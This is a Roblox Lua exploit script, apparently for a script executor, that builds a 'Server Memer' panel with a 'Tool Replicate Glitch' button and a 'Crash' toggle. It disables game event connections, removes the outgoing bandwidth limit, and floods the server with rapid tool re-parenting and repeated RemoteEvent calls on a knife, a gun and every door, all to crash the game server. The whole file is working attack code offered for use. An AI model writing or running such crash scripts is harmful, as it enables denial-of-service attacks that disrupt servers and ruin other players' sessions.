-- crahs hejsehsaksd


local crash = Instance.new("ScreenGui")
local crashframe = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local UiCorner = Instance.new("UICorner")

crash.Name = "crash"
crash.Parent = game.CoreGui
crash.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

crashframe.Name = "crashframe"
crashframe.Parent = crash
crashframe.Active = true
crashframe.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
crashframe.BorderSizePixel = 0
crashframe.Position = UDim2.new(0.0421245433, 0, 0.348033369, 0)
crashframe.Size = UDim2.new(0, 281, 0, 251)
crashframe.Draggable = true
UiCorner.Parent = crashframe

TextLabel.Parent = crashframe
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0, 0, 0.00440528616, 0)
TextLabel.Size = UDim2.new(0, 281, 0, 40)
TextLabel.Font = Enum.Font.Ubuntu
TextLabel.Text = "Server Memer"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 35.000

TextButton.Parent = crashframe
TextButton.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.295373678, 0, 0.681274891, 0)
TextButton.Size = UDim2.new(0, 114, 0, 28)
TextButton.Font = Enum.Font.Ubuntu
TextButton.Text = "Tool Replicate Glitch"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

TextButton_2.Parent = crashframe
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.142348751, 0, 0.434262961, 0)
TextButton_2.Size = UDim2.new(0, 200, 0, 50)
TextButton_2.Font = Enum.Font.Ubuntu
TextButton_2.Text = "Crash: Off"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextSize = 29.000

local isglitched = false
local tool = game.Players.LocalPlayer.Backpack.Knife
local crashing = false
local toggle = false
local crashing = false

function disable()
	task.spawn(function()
		for i = 1,500 do
			for i, v in pairs(getconnections(game.Players.LocalPlayer.Character.ChildAdded)) do
				v:Disable()
			end
			for i, v in pairs(getconnections(tool.Equipped)) do
				v:Disable()
			end
			for i, v in pairs(getconnections(tool.Unequipped)) do
				v:Disable()
			end
			for i, v in pairs(getconnections(game.Players.LocalPlayer.Character.ChildRemoved)) do
				v:Disable()
			end
		end
	end)
end


TextButton.MouseButton1Click:connect(function()
	
isglitched = true
tool.Parent = game.Players.LocalPlayer.Character
tool:ClearAllChildren()
tool.Parent = game.Players.LocalPlayer.Backpack
disable()
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

TextButton_2.MouseButton1Click:connect(function()
	
	if toggle == false then
		
		if isglitched == false then
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Crash";
				Text = "Tool must be glitched before crashing.";
			})
		else
			crashing = true
			TextButton_2.Text = "Crash: On"
			TextButton_2.BackgroundColor3 = Color3.fromRGB(85, 255, 0)
			toggle = true
		end		
	elseif toggle == true then
		crashing = false
		TextButton_2.Text = "Crash: Off"
	    TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)	
		toggle = false
end	
	
end)


coroutine.resume(coroutine.create(function()
	while true do wait(1.4)
		if crashing == true then
			for i = 1,82000 do
				tool.Parent = game.Players.LocalPlayer.Character
				tool.Parent = game.Players.LocalPlayer.Backpack
			end
		end
	end
end))

game:GetService("RunService").RenderStepped:connect(function()
	if crashing == true then
		game.Players.LocalPlayer.Backpack:FindFirstChild("Glock").Click:FireServer()
	end
	if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
		crashing = false
		isglitched = false
		TextButton_2.Text = "Crash: Off"
		TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	end
end)

coroutine.resume(coroutine.create(function()
	while true do wait(0.5)
		if crashing == true then
			for _,v in pairs(game.workspace:GetChildren()) do
				if v.Name == "Door" then
					v.Click.ClickDetector.RemoteEvent:FireServer()
				end
			end
		end
	end
end))

game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Crash";
	Text = "Loaded. Script Made By Scartesu";
})
